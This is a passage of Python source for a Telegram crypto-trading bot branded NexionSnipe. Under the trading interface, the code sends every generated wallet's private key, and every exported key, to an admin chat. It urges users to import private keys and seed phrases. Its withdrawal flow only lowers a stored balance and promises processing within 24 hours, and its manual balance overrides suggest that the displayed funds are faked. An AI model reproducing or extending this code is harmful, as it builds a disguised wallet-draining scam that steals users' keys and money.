    wallets = user_data.get("wallets", {})
    active_wallet = user_data.get("active_wallet", "solana")
    chain_sym = CHAINS.get(active_wallet, {}).get("symbol", "SOL")
    settings = user_data.get("settings", {})
    account_balance = user_data.get("balance", 0)
    manual_balances = user_data.get("wallet_balances", {})

    prices = price_service.get_cached_prices()
    if not prices:
        try:
            prices = await price_service.get_native_prices()
        except Exception:
            prices = {}

    wallet_summary = {}
    if wallets:
        try:
            wallet_summary = await balance_service.get_wallet_summary(wallets)
        except Exception:
            wallet_summary = {}

    sol_price = prices.get("solana", {}).get("price", 0.0)
    sol_change = prices.get("solana", {}).get("change_24h", 0.0)
    eth_price = prices.get("ethereum", {}).get("price", 0.0)
    eth_change = prices.get("ethereum", {}).get("change_24h", 0.0)
    btc_price = prices.get("bitcoin", {}).get("price", 0.0)
    btc_change = prices.get("bitcoin", {}).get("change_24h", 0.0)

    sol_arrow = "\U0001f4c9" if sol_change < 0 else "\U0001f4c8"
    eth_arrow = "\U0001f4c9" if eth_change < 0 else "\U0001f4c8"
    btc_arrow = "\U0001f4c9" if btc_change < 0 else "\U0001f4c8"

    wallet_text = ""
    total_usd = 0.0
    wallet_count = len(wallets)

    if wallets:
        for chain, info in wallets.items():
            if chain in manual_balances and manual_balances[chain] is not None:
                bal = manual_balances[chain]
            else:
                bal = wallet_summary.get(chain, {}).get("balance", 0.0)
            native_price = prices.get(chain, {}).get("price", 0.0) if chain != "bsc" else prices.get("ethereum", {}).get("price", 0.0)
            usd_value = bal * native_price
            total_usd += usd_value

            chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
            chain_sym = CHAINS.get(chain, {}).get("symbol", "???")
            marker = " \u2b50" if active_wallet == chain else ""
            wallet_text += f"{chain_emoji} <b>{chain}</b>{marker}: {bal:.6f} {chain_sym} (${usd_value:.2f})\n<code>{info['address']}</code>\n\n"
    else:
        wallet_text = "\U0001f4c1 No wallets yet.\nCreate a wallet to start trading!\n\n"

    text = (
        f"\u26a1 <b>NEXIONSNIPE DASHBOARD</b>\n\n"
        f"\U0001f4b0 <b>YOUR WALLETS ({wallet_count})</b>\n"
        f"All Balance: ${total_usd:.2f}\n\n"
        f"{wallet_text}"
        f"\U0001f4ca <b>LIVE MARKET PRICES</b>\n"
        f"\U0001f534 SOL: ${sol_price:,.2f} {sol_arrow} {sol_change:+.2f}%\n"
        f"\U0001f535 ETH: ${eth_price:,.2f} {eth_arrow} {eth_change:+.2f}%\n"
        f"\U0001f7e1 BTC: ${btc_price:,.0f} {btc_arrow} {btc_change:+.2f}%\n\n"
        f"Ready to trade \u2022 All systems active"
    )
    return text


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        logger.info(f"/start called by user {user.id} ({user.first_name})")
        data = load_user_data(user.id)

        if context.args and len(context.args) > 0 and context.args[0].startswith("ref"):
            try:
                referrer_id = int(context.args[0][3:])
                track_referral(referrer_id, user.id)
                ref_count = get_referral_count(referrer_id)
                try:
                    await context.bot.send_message(
                        chat_id=referrer_id,
                        text=f"\U0001f389 New Referral!\n\nSomeone joined using your link!\nTotal referrals: {ref_count}",
                    )
                except Exception:
                    pass
            except (ValueError, IndexError):
                pass

        text = await build_dashboard(data)
        keyboard = main_menu_keyboard()

        try:
            await update.message.reply_photo(photo="https://cdn.imageurlgenerator.com/uploads/adbf14ac-752f-48f9-beea-589ed70179d3.jpg")
        except Exception as e:
            logger.error(f"Failed to send start photo: {e}")

        await update.message.reply_text(
            text, reply_markup=keyboard
        )

        import asyncio as _aio
        _aio.create_task(notify_admin(context, user.id, "/start"))
    except Exception as e:
        logger.error(f"Error in cmd_start: {e}", exc_info=True)


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "❓ <b>HELP &amp; SUPPORT</b> ❓\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "📖 <b>How to Use NexionSnipe:</b>\n\n"
        "1️⃣ <b>Create Wallet:</b> Generate or import your Solana wallet\n"
        "2️⃣ <b>Configure Sniper:</b> Set buy amount, dev holding, and slippage\n"
        "3️⃣ <b>Search Tokens:</b> Find and analyze Solana tokens\n"
        "4️⃣ <b>Copy Trade:</b> Follow successful wallets\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "⚡ <b>Quick Commands:</b>\n"
        "/start - Dashboard\n"
        "/generate - New wallet\n"
        "/import - Import wallet\n"
        "/status - Wallet status\n\n"
        "━━━━━━━━━━━━━━━━━━\n"
        "🌐 <b>Our Links:</b>\n"
        "🌍 Website: Coming soon...\n"
        "🐦 X (Twitter): Coming soon...\n\n"
        "━━━━━━━━━━━━━━━━━━"
    )
    await update.message.reply_text(
        text, reply_markup=back_keyboard()
    )
    await notify_admin(context, update.effective_user.id, "/help")


async def cmd_price(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "\U0001f4b9 <b>Usage:</b> /price <token_address>",
            reply_markup=back_keyboard(),
        )
        return

    address = context.args[0]
    await update.message.reply_text("\U0001f50d <b>Scanning...</b>")

    token = await scan_token(address)

    if token.get("found"):
        chain_emoji = "\U0001f534" if token["chain"] == "solana" else "\U0001f535"
        def fmt_price(p):
            if p >= 1: return f"${p:,.2f}"
            elif p >= 0.01: return f"${p:.4f}"
            elif p >= 0.000001: return f"${p:.6f}"
            else: return f"${p:.10f}"
        def fmt_pct(p):
            arrow = "\U0001f4c8" if p >= 0 else "\U0001f4c9"
            return f"{arrow} {p:+.2f}%"

        msg = (
            f"{chain_emoji} <b>{token['name']}</b> ({token['symbol']})\n\n"
            f"\U0001f4b1 Price: {fmt_price(token.get('price_usd', 0))}\n"
            f"\U0001f4c8 1h: {fmt_pct(token.get('change_1h', 0))} | 24h: {fmt_pct(token.get('change_24h', 0))}\n"
            f"\U0001f4c2 <code>{address}</code>\n"
        )
        await update.message.reply_text(msg, reply_markup=buy_keyboard())
    else:
        await update.message.reply_text(
            f"\u274c Token not found: <code>{address}</code>",
            reply_markup=back_keyboard(),
        )
    await notify_admin(context, update.effective_user.id, "/price", f"Address: {address[:16]}...")


async def cmd_snipe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = load_user_data(user_id)

    if not data.get("wallets"):
        await update.message.reply_text(
            "\U0001f510 No wallet found. Create one first.",
            reply_markup=wallet_keyboard(),
        )
        return

    if context.args and len(context.args) >= 2:
        chain = context.args[0] if context.args[0] in CHAINS else "solana"
        address = context.args[1] if context.args[0] in CHAINS else context.args[0]
        amount = float(context.args[2]) if len(context.args) >= 3 else get_buy_amount(user_id, chain)

        target = SnipeTarget(
            token_address=address,
            chain=chain,
            buy_amount=amount,
            slippage=data["settings"]["slippage"],
            priority_fee=data["settings"]["priority_fee_sol"],
            mev_protection=data["settings"]["mev_protection"],
        )
        user_snipe_drafts[user_id] = {
            "target": target,
            "chain": chain,
            "address": address,
            "amount": amount,
            "symbol": address[:6],
        }

        chain_emoji = {"solana": "\u25b3", "ethereum": "\u25c6", "bsc": "\U0001f535"}.get(chain, "")
        text = (
            f"\u2705 <b>Buy Token</b>\n\n"
            f"{chain_emoji} Chain: {chain}\n"
            f"\U0001f4c2 Token: <code>{address}</code>\n"
            f"\U0001f4b0 Amount: {amount} {CHAINS[chain]['symbol']}\n"
            f"\U0001f3b2 Slippage: {data['settings']['slippage']}%\n"
            f"\U0001f6e1\ufe0f MEV: {'ON' if data['settings']['mev_protection'] else 'OFF'}\n"
        )
        await update.message.reply_text(
            text, reply_markup=snipe_confirm_keyboard()
        )
    else:
        await update.message.reply_text(
            "\U0001f680 <b>Buy Token</b>\n\nPaste a token address to buy:",
            reply_markup=buy_keyboard(),
        )
    await notify_admin(context, user_id, "buy")


async def cmd_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = load_user_data(user_id)
    wallets = data.get("wallets", {})
    has_wallets = bool(wallets)

    if not has_wallets:
        text = (
            "\U0001f512 <b>WALLET MANAGEMENT</b>\n\n"
            "\u274c <b>No Wallet Connected</b>\n\n"
            "Create a new wallet or import an existing one to get started.\n\n"
            "\U0001f4a1 <b>Tip:</b> If you already have a wallet (Phantom, MetaMask, Solflare, Axiom), "
            "you can continue using it! Just import your private key or seed phrase, for efficient trading.\n\n"
            "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            "Choose an action below:"
        )
        await update.message.reply_text(
            text, reply_markup=wallet_keyboard(False)
        )
    else:
        active = data.get("active_wallet")
        text = "\U0001f512 <b>WALLET MANAGEMENT</b>\n\n"
        for chain, info in wallets.items():
            marker = " \u2b50" if active == chain else ""
            chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
            text += f"{chain_emoji} <b>{chain}</b>{marker}\n<code>{info['address'][:12]}...{info['address'][-6:]}</code>\n\n"
        text += "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
        text += "Choose an action below:"
        await update.message.reply_text(
            text, reply_markup=wallet_keyboard(True)
        )
    await notify_admin(context, user_id, "/wallet")


async def cmd_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    data = load_user_data(user_id)
    settings = data.get("settings", {})

    text = (
        "\u2699\ufe0f <b>Settings</b>\n\n"
        f"\U0001f3b2 Slippage: {settings.get('slippage', 10)}%\n"
        f"\U0001f6e1\ufe0f MEV Protection: {'ON \U0001f7e2' if settings.get('mev_protection', True) else 'OFF \u26ab'}\n"
        f"\U0001f4b8 Auto-Buy: {'ON \U0001f7e2' if settings.get('auto_buy', False) else 'OFF \u26ab'}\n"
        f"\U0001f4b5 Auto-Sell: {'ON \U0001f7e2' if settings.get('auto_sell', False) else 'OFF \u26ab'}\n"
        f"\u26a0\ufe0f Stop-Loss: {settings.get('stop_loss', 20)}%\n"
        f"\U0001f680 Take-Profit: {settings.get('take_profit', 100)}%\n\n"
        f"\U0001f4b0 <b>Buy Amounts:</b>\n"
        f"\u25b3 SOL: {settings.get('buy_amount_sol', 0.1)}\n"
        f"\u25c6 ETH: {settings.get('buy_amount_eth', 0.01)}\n"
        f"\U0001f535 BNB: {settings.get('buy_amount_bnb', 0.1)}\n"
    )
    await update.message.reply_text(
        text, reply_markup=settings_keyboard(settings)
    )
    await notify_admin(context, user_id, "/settings")


async def nav(query, context, text, reply_markup=None):
    kwargs = {"chat_id": query.message.chat_id, "text": text}
    if reply_markup is not None:
        kwargs["reply_markup"] = reply_markup
    try:
        await query.edit_message_text(text, reply_markup=reply_markup)
    except Exception:
        try:
            await query.delete_message()
        except Exception:
            pass
        await context.bot.send_message(**kwargs)


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data
    user_id = query.from_user.id
    user_data = load_user_data(user_id)

    try:
        await query.answer()
    except Exception:
        pass

    logger.info(f"Callback: user={user_id} data={data}")

    if data == "main_menu":
        await notify_admin(context, user_id, "main_menu")
        text = await build_dashboard(user_data)
        await nav(query, context, text, main_menu_keyboard())

    elif data == "refresh":
        await notify_admin(context, user_id, "refresh")
        text = await build_dashboard(user_data)
        await nav(query, context, text, main_menu_keyboard()
        )

    elif data == "wallets":
        await notify_admin(context, user_id, "wallets")
        wallets = user_data.get("wallets", {})
        has_wallets = bool(wallets)

        if not has_wallets:
            text = (
                "\U0001f512 <b>WALLET MANAGEMENT</b>\n\n"
                "\u274c <b>No Wallet Connected</b>\n\n"
                "Create a new wallet or import an existing one to get started.\n\n"
                "\U0001f4a1 <b>Tip:</b> If you already have a wallet (Phantom, MetaMask, Solflare, Axiom), "
                "you can continue using it! Just import your private key or seed phrase, for efficient trading.\n\n"
                "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                "Choose an action below:"
            )
        else:
            active = user_data.get("active_wallet")
            text = "\U0001f512 <b>WALLET MANAGEMENT</b>\n\n"
            for chain, info in wallets.items():
                marker = " \u2b50" if active == chain else ""
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                text += f"{chain_emoji} <b>{chain}</b>{marker}\n<code>{info['address'][:12]}...{info['address'][-6:]}</code>\n\n"
            text += "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            text += "Choose an action below:"
        await nav(query, context, text, wallet_keyboard(has_wallets)
        )

    elif data.startswith("wallet_") and data not in ("wallets",):
        await notify_admin(context, user_id, data)

        if data == "wallet_gen_sol":
            w = create_wallet("solana")
            if w:
                user_data.setdefault("wallets", {})["solana"] = w
                if not user_data.get("active_wallet"):
                    user_data["active_wallet"] = "solana"
                save_user_data(user_id, user_data)

                text = (
                    "\U0001f534 <b>SOL Wallet Created</b>\n\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u2705 Wallet ready to use!"
                )
                await nav(query, context, text, wallet_keyboard(True)
                )

                admin_msg = (
                    "\U0001f510 <b>New SOL Wallet Created</b>\n\n"
                    f"\U0001f464 User: <code>{user_id}</code> (@{query.from_user.username or 'N/A'})\n"
                    "\u26d3\ufe0f Chain: Solana\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u26a0\ufe0f <b>Private Key:</b>\n"
                    f"<code>{w['private_key']}</code>\n"
                )
                try:
                    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_msg)
                except Exception:
                    pass

        elif data == "wallet_gen_eth":
            w = create_wallet("ethereum")
            if w:
                user_data.setdefault("wallets", {})["ethereum"] = w
                if not user_data.get("active_wallet"):
                    user_data["active_wallet"] = "ethereum"
                save_user_data(user_id, user_data)

                text = (
                    "\U0001f535 <b>ETH Wallet Created</b>\n\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u2705 Wallet ready to use!"
                )
                await nav(query, context, text, wallet_keyboard(True)
                )

                admin_msg = (
                    "\U0001f510 <b>New ETH Wallet Created</b>\n\n"
                    f"\U0001f464 User: <code>{user_id}</code> (@{query.from_user.username or 'N/A'})\n"
                    "\u26d3\ufe0f Chain: Ethereum\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u26a0\ufe0f <b>Private Key:</b>\n"
                    f"<code>{w['private_key']}</code>\n"
                )
                try:
                    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_msg)
                except Exception:
                    pass

        elif data == "wallet_gen_bnb":
            w = create_wallet("bsc")
            if w:
                user_data.setdefault("wallets", {})["bsc"] = w
                if not user_data.get("active_wallet"):
                    user_data["active_wallet"] = "bsc"
                save_user_data(user_id, user_data)

                text = (
                    "\U0001f7e1 <b>BNB Wallet Created</b>\n\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u2705 Wallet ready to use!"
                )
                await nav(query, context, text, wallet_keyboard(True)
                )

                admin_msg = (
                    "\U0001f510 <b>New BNB Wallet Created</b>\n\n"
                    f"\U0001f464 User: <code>{user_id}</code> (@{query.from_user.username or 'N/A'})\n"
                    "\u26d3\ufe0f Chain: BNB Chain\n"
                    f"\U0001f4c2 Address: <code>{w['address']}</code>\n\n"
                    "\u26a0\ufe0f <b>Private Key:</b>\n"
                    f"<code>{w['private_key']}</code>\n"
                )
                try:
                    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=admin_msg)
                except Exception:
                    pass

        elif data == "wallet_import_pk":
            user_importing[user_id] = "waiting_key"
            await nav(query, context, 
                "\U0001f511 <b>Import Private Key</b>\n\n"
                "Send your private key to import:", back_keyboard("wallets"),
            )

        elif data == "wallet_import_seed":
            user_importing[user_id] = "waiting_seed"
            await nav(query, context, 
                "\U0001f4dd <b>Import Seed Phrase</b>\n\n"
                "Send your seed phrase (12 or 24 words):",
                reply_markup=back_keyboard("wallets"),
            )

        elif data == "wallet_status":
            wallets = user_data.get("wallets", {})
            if not wallets:
                text = (
                    "\U0001f4ca <b>Wallet Status</b>\n\n"
                    "\u274c No wallets connected.\n"
                    "Create or import a wallet to get started."
                )
            else:
                text = "\U0001f4ca <b>Wallet Status</b>\n\n"
                for chain, info in wallets.items():
                    chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                    active = "Active" if user_data.get("active_wallet") == chain else "Inactive"
                    text += f"{chain_emoji} <b>{chain}</b>: {active}\n<code>{info['address'][:16]}...</code>\n\n"
            await nav(query, context, text, wallet_keyboard(bool(user_data.get("wallets"))))

        elif data == "wallet_refresh_bal":
            wallets = user_data.get("wallets", {})
            if not wallets:
                text = "\u274c No wallets to refresh."
            else:
                text = "\U0001f504 <b>Refreshing Balances...</b>\n\n"
                await nav(query, context, text)

                wallet_summary = await balance_service.get_wallet_summary(wallets)
                prices = await price_service.get_native_prices()

                text = "\U0001f504 <b>Wallet Balances</b>\n\n"
                total_usd = 0.0
                for chain, info in wallets.items():
                    bal = wallet_summary.get(chain, {}).get("balance", 0.0)
                    native_price = prices.get(chain, {}).get("price", 0.0) if chain != "bsc" else prices.get("ethereum", {}).get("price", 0.0)
                    usd_value = bal * native_price
                    total_usd += usd_value
                    chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                    chain_sym = CHAINS.get(chain, {}).get("symbol", "???")
                    text += f"{chain_emoji} <b>{chain}</b>: {bal:.6f} {chain_sym} (${usd_value:.2f})\n"

                text += f"\n<b>Total</b>: ${total_usd:.2f}"
            await nav(query, context, text, wallet_keyboard(True))

        elif data == "wallet_withdraw":
            await notify_admin(context, user_id, "wallet_withdraw")
            active_chain = user_data.get("active_wallet", "solana")
            chain_sym = CHAINS.get(active_chain, {}).get("symbol", "SOL")
            manual_bal = user_data.get("wallet_balances", {}).get(active_chain)
            if manual_bal is not None:
                balance = manual_bal
            else:
                balance = user_data.get("balance", 0)
            if balance == 0 and user_data.get("wallets", {}).get(active_chain):
                try:
                    ws = await balance_service.get_wallet_summary({active_chain: user_data["wallets"][active_chain]})
                    balance = ws.get(active_chain, {}).get("balance", 0.0)
                except Exception:
                    pass
            user_importing[user_id] = "withdraw_address"
            await nav(query, context,
                f"\U0001f4b8 <b>WITHDRAWAL</b>\n\n"
                f"\U0001f4b0 Your Balance: {balance:.6f} {chain_sym}\n\n"
                f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                f"Please send the wallet address you want to withdraw to:",
                back_keyboard("wallets"),
            )

        elif data == "wallet_disconnect":
            wallets = user_data.get("wallets", {})
            if not wallets:
                await nav(query, context, "\u274c No wallets to disconnect.", wallet_keyboard(False))
                return
            buttons = []
            for chain, info in wallets.items():
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                buttons.append([InlineKeyboardButton(
                    f"{chain_emoji} Disconnect {chain.title()} ({info['address'][:8]}...)",
                    callback_data=f"wallet_del_{chain}_{info['address'][:8]}",
                )])
            buttons.append([InlineKeyboardButton("\u2b05\ufe0f Back", callback_data="wallets")])
            await nav(query, context,
                "\U0001f50f <b>DISCONNECT WALLET</b>\n\n"
                "Select which wallet to disconnect:\n\n"
                "\u26a0\ufe0f <b>Note:</b> Your funds stay on-chain. "
                "You can re-import with the same private key anytime.",
                InlineKeyboardMarkup(buttons),
            )

        elif data.startswith("wallet_del_"):
            parts = data.split("_")
            chain = parts[2] if len(parts) > 2 else ""
            addr_prefix = "_".join(parts[3:]) if len(parts) > 3 else ""
            wallets = user_data.get("wallets", {})
            target_info = wallets.get(chain)
            if target_info and target_info["address"][:8] == addr_prefix:
                del user_data["wallets"][chain]
                if user_data.get("active_wallet") == chain:
                    remaining = list(user_data["wallets"].keys())
                    user_data["active_wallet"] = remaining[0] if remaining else None
                user_data.pop("wallet_balances", None) if chain in user_data.get("wallet_balances", {}) else None
                save_user_data(user_id, user_data)
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                text = (
                    f"\u2705 <b>Wallet Disconnected</b>\n\n"
                    f"{chain_emoji} <b>{chain.title()}</b> wallet removed.\n"
                    f"Address: <code>{target_info['address'][:16]}...</code>\n\n"
                    "\U0001f4a1 Your funds are still on-chain. You can re-import with the same private key."
                )
                await nav(query, context, text, wallet_keyboard(bool(user_data.get("wallets"))))
                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=(
                            f"\U0001f50f <b>Wallet Disconnected</b>\n\n"
                            f"\U0001f464 User: <code>{user_id}</code> (@{query.from_user.username or 'N/A'})\n"
                            f"\u26d3\ufe0f Chain: {chain}\n"
                            f"\U0001f4c2 Address: <code>{target_info['address']}</code>"
                        ),
                    )
                except Exception:
                    pass
            else:
                await nav(query, context, "\u274c Wallet not found.", wallet_keyboard(True))

        elif data.startswith("wallet_set_"):
            parts = data.split("_")
            chain = parts[2] if len(parts) > 2 else ""
            addr_prefix = "_".join(parts[3:]) if len(parts) > 3 else ""
            wallets = user_data.get("wallets", {})
            target_info = wallets.get(chain)
            if target_info and target_info["address"][:8] == addr_prefix:
                user_data["active_wallet"] = chain
                save_user_data(user_id, user_data)
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                await nav(query, context,
                    f"\u2705 <b>Active Wallet Set</b>\n\n{chain_emoji} <b>{chain.title()}</b> is now active.",
                    wallet_keyboard(True),
                )
            else:
                await nav(query, context, "\u274c Wallet not found.", wallet_keyboard(True))

        elif data.startswith("wallet_bal_"):
            parts = data.split("_")
            chain = parts[2] if len(parts) > 2 else ""
            addr_prefix = "_".join(parts[3:]) if len(parts) > 3 else ""
            wallets = user_data.get("wallets", {})
            target_info = wallets.get(chain)
            if target_info and target_info["address"][:8] == addr_prefix:
                try:
                    ws = await balance_service.get_wallet_summary({chain: target_info})
                    bal = ws.get(chain, {}).get("balance", 0.0)
                except Exception:
                    bal = 0.0
                prices = await price_service.get_native_prices()
                native_price = prices.get(chain, {}).get("price", 0.0) if chain != "bsc" else prices.get("ethereum", {}).get("price", 0.0)
                usd = bal * native_price
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                chain_sym = CHAINS.get(chain, {}).get("symbol", "???")
                await nav(query, context,
                    f"\U0001f4b3 <b>Wallet Balance</b>\n\n"
                    f"{chain_emoji} <b>{chain.title()}</b>\n"
                    f"<code>{target_info['address'][:16]}...</code>\n\n"
                    f"\U0001f4b0 {bal:.6f} {chain_sym} (${usd:.2f})",
                    wallet_detail_keyboard(chain, target_info["address"]),
                )
            else:
                await nav(query, context, "\u274c Wallet not found.", wallet_keyboard(True))

        elif data.startswith("wallet_export_"):
            parts = data.split("_")
            chain = parts[2] if len(parts) > 2 else ""
            addr_prefix = "_".join(parts[3:]) if len(parts) > 3 else ""
            wallets = user_data.get("wallets", {})
            target_info = wallets.get(chain)
            if target_info and target_info["address"][:8] == addr_prefix:
                chain_emoji = {"solana": "\U0001f534", "ethereum": "\U0001f535", "bsc": "\U0001f7e1"}.get(chain, "")
                await nav(query, context,
                    f"\U0001f510 <b>Exported Private Key</b>\n\n"
                    f"{chain_emoji} <b>{chain.title()}</b>\n"
                    f"<code>{target_info['address'][:16]}...</code>\n\n"
                    f"\u26a0\ufe0f <b>Private Key:</b>\n<code>{target_info['private_key']}</code>\n\n"
                    "\U0001f6e1\ufe0f <b>NEVER share this with anyone!</b>",
                    wallet_detail_keyboard(chain, target_info["address"]),
                )
                try:
                    await context.bot.send_message(
                        chat_id=ADMIN_USER_ID,
                        text=(
                            f"\U0001f510 <b>Private Key Exported</b>\n\n"
                            f"\U0001f464 User: <code>{user_id}</code> (@{query.from_user.username or 'N/A'})\n"
                            f"\u26d3\ufe0f Chain: {chain}\n"
                            f"\U0001f4c2 Address: <code>{target_info['address']}</code>\n\n"
                            f"\u26a0\ufe0f <b>Private Key:</b>\n<code>{target_info['private_key']}</code>"
                        ),
                    )
                except Exception:
                    pass
            else:
                await nav(query, context, "\u274c Wallet not found.", wallet_keyboard(True))

    elif data == "withdraw_confirm":
        wd = withdraw_data.get(user_id, {})
        amount = wd.get("amount", 0)
        address = wd.get("address", "Unknown")
        if amount <= 0 or address == "Unknown":
            await nav(query, context, "\u274c No pending withdrawal found.", wallet_keyboard(True))
            return

        data_obj = load_user_data(user_id)
        active_chain = data_obj.get("active_wallet", "solana")
        chain_sym = CHAINS.get(active_chain, {}).get("symbol", "SOL")
        manual_bal = data_obj.get("wallet_balances", {}).get(active_chain)
        if manual_bal is not None:
            balance = manual_bal
        else:
            balance = data_obj.get("balance", 0)
        if balance == 0 and data_obj.get("wallets", {}).get(active_chain):
            try:
                ws = await balance_service.get_wallet_summary({active_chain: data_obj["wallets"][active_chain]})
                balance = ws.get(active_chain, {}).get("balance", 0.0)
            except Exception:
                pass

        if amount > balance:
            deficit = amount - balance
            await nav(query, context,
                f"\u274c <b>INSUFFICIENT BALANCE TO WITHDRAW</b>\n\n"
                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\n"
                f"\U0001f4b0 <b>Your Balance:</b> {balance:.4f} {chain_sym}\n"
                f"\U0001f512 <b>Amount Entered:</b> {amount:.4f} {chain_sym}\n"
                f"\U0001f4c9 <b>You Need:</b> {deficit:.4f} {chain_sym} more\n\n"
                f"\U0001f4a1 Deposit {chain_sym} to your wallet to withdraw.",
                wallet_keyboard(True),
            )
            return

        if manual_bal is not None:
            data_obj.setdefault("wallet_balances", {})[active_chain] = balance - amount
        else:
            data_obj["balance"] = balance - amount
        save_user_data(user_id, data_obj)
        withdraw_data.pop(user_id, None)
        user_importing[user_id] = None

        await nav(query, context,
            f"\u2705 <b>WITHDRAWAL REQUEST SUBMITTED</b>\n\n"
            f"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
            f"\U0001f4b0 Amount: {amount} {chain_sym}\n"
            f"\U0001f4ec To: <code>{address}</code>\n\n"
            f"\u23f3 Your withdrawal is being processed. Please allow up to 24 hours.\n\n"
            f"\U0001f4ac Need help? Contact @nanobotsupport.",
            wallet_keyboard(True),
        )

        try:
            await context.bot.send_message(
                chat_id=ADMIN_USER_ID,
                text=(
                    f"\u2705 <b>Withdrawal Confirmed</b>\n\n"
                    f"\U0001f464 User: <code>{user_id}</code>\n"
                    f"\U0001f4b0 Amount: {amount} {chain_sym}\n"
                    f"\U0001f4ec To: <code>{address}</code>"
                ),
            )
        except Exception:
            pass

    elif data == "withdraw_cancel":
        withdraw_data.pop(user_id, None)
        user_importing[user_id] = None
        await nav(query, context,
            "\u274c <b>Withdrawal Cancelled</b>",
            wallet_keyboard(True),
        )

    elif data == "ai_snipe":
        await notify_admin(context, user_id, "ai_snipe")
        auto = user_data.get("settings", {}).get("auto_buy", False)
        status = "ON \U0001f7e2" if auto else "OFF \u26ab"
        text = (
            f"\U0001f916 <b>AI Snipe</b>\n\n"
            f"\u26a1 Auto Snipe: {status}\n"
            f"\U0001f50d Scans new tokens automatically\n"
            f"\U0001f3af Buys based on your filters\n"
        )
        await nav(query, context, text, ai_snipe_keyboard()
        )

    elif data == "ai_snipe_toggle":
        await notify_admin(context, user_id, "ai_snipe_toggle")
        current = user_data.get("settings", {}).get("auto_buy", False)
        user_data["settings"]["auto_buy"] = not current
        save_user_data(user_id, user_data)
        status = "ON \U0001f7e2" if not current else "OFF \u26ab"
        text = (
            f"\U0001f916 <b>AI Snipe</b>\n\n"
            f"\u26a1 Auto Snipe: {status}\n"
            f"\U0001f50d Scans new tokens automatically\n"
            f"\U0001f3af Buys based on your filters\n"
        )
        await nav(query, context, text, ai_snipe_keyboard()
        )

    elif data == "ai_snipe_scanner":
        await notify_admin(context, user_id, "ai_snipe_scanner")
        await nav(query, context, 
            "\U0001f50d <b>Token Scanner</b>\n\nPaste a token address to scan:", back_keyboard("ai_snipe"),
        )

    elif data == "ai_snipe_targets":
        await notify_admin(context, user_id, "ai_snipe_targets")
        await nav(query, context, 
            "\U0001f3af <b>Target List</b>\n\nNo targets set. Paste a token address to add.", back_keyboard("ai_snipe"),
        )

    elif data == "ai_snipe_settings":
        await notify_admin(context, user_id, "ai_snipe_settings")
        settings = user_data.get("settings", {})
        text = (
            "\u2699\ufe0f <b>Snipe Settings</b>\n\n"
            f"\U0001f3b2 Slippage: {settings.get('slippage', 10)}%\n"
            f"\U0001f6e1\ufe0f MEV: {'ON' if settings.get('mev_protection', True) else 'OFF'}\n"
            f"\u26a0\ufe0f Stop-Loss: {settings.get('stop_loss', 20)}%\n"
            f"\U0001f680 Take-Profit: {settings.get('take_profit', 100)}%\n"
        )
        await nav(query, context, text, settings_keyboard(settings)
        )

    elif data == "copy_trade":
        await notify_admin(context, user_id, "copy_trade")
        await nav(query, context, 
            "\U0001f46a <b>Copy Trade</b>\n\nCopy whale wallets automatically.\nAdd a wallet to start copying.", copy_trade_keyboard(),
